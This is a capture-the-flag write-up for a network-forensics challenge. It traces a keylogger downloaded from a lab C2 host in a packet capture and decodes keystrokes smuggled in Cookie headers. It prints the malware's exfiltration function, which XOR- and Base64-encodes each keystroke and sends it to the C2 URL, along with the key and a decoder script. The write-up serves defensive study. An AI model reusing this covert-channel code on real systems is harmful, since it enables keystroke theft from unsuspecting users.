# Hacker Holidays: Day 4 - Packed Light

**Category:** Forensics
**Difficulty:** Easy

## 🛎️ Concierge Briefing
> A packet capture of "regular" HTTP traffic isn't so regular. Somebody stuffed a whole conversation into a Cookie header — time to look where nobody usually looks.

---

## 🕵️‍♂️ Recon

We're handed `traffic.pcapng` — no web app this time, just a capture. The hint points at HTTP traffic to a random host on port 8080 with suspicious headers.

First filter in Wireshark:

```text
http.request
```

One GET stands out:

```text
GET /temp/updates.py HTTP/1.1
```

A script being pulled from a `/temp/` path is the usual smell of a C2 beacon. Export it via `File -> Export Objects -> HTTP`.

## 🐍 The "updates.py" Script

The imports are already suspicious:

```python
import requests
import base64
from pynput import keyboard
```

It's a keylogger, and it contains the C2 URL:

```python
C2_URL = "http://byte-lotus-hotel.thm:8080/"
```

## 🍪 The Covert Channel

The exfiltration function encodes each keystroke and ships it inside a Cookie header:

```python
def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))

    b64_string = base64.b64encode(encrypted).decode('utf-8')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    requests.get(C2_URL, headers=headers, timeout=0.5)
```

So each HTTP request carries exactly one encoded character in `Cookie: hotel_sess_state=...`.

## 🧮 The XOR Gotcha

The key function returns a long string:

```python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
```

Full key: `H0t3lSt@ff0NlyK3epS3cr3t!`. But feeding that in produces garbage. The bug: `sendltr()` encrypts **one character at a time**, so `raw_bytes` is a single byte and the XOR loop only ever touches index `0` — meaning only the **first byte of the key** is used. Effective key: `H` (`0x48`).

## 🔑 Decoding

Pull the cookie values out of the capture and reverse the chain:

```text
Cookie value -> Base64 decode -> XOR 0x48 -> character
```

```python
import base64, re
from pathlib import Path

pcap = Path("traffic.pcapng").read_bytes()
cookies = re.findall(rb"hotel_sess_state=([A-Za-z0-9+/=]+)", pcap)

flag = "".join(chr(base64.b64decode(c)[0] ^ ord("H")) for c in cookies)
print(flag)
```

## 🚩 The Flag

**Flag:** `THM{REDACTED}`

## 💡 Why This Works

The traffic looks like innocuous HTTP, but each request leaks one keystroke in a header field. Detection angles: repeated small requests to odd hosts/ports, Base64-looking values in `Cookie`/`User-Agent`/custom headers, and a suspicious script download earlier in the stream. And the "encryption" had a bug — single-byte XOR — so the whole channel decodes in a few lines.

## 📝 Final Thoughts

Network forensics is about noticing what *doesn't belong*: a weird header, a temp-path download, a keylogger import. Follow the artifact, find the channel, reverse the encoding.

**Documented and tested for TryHackMe — Hacker Holidays 2026**
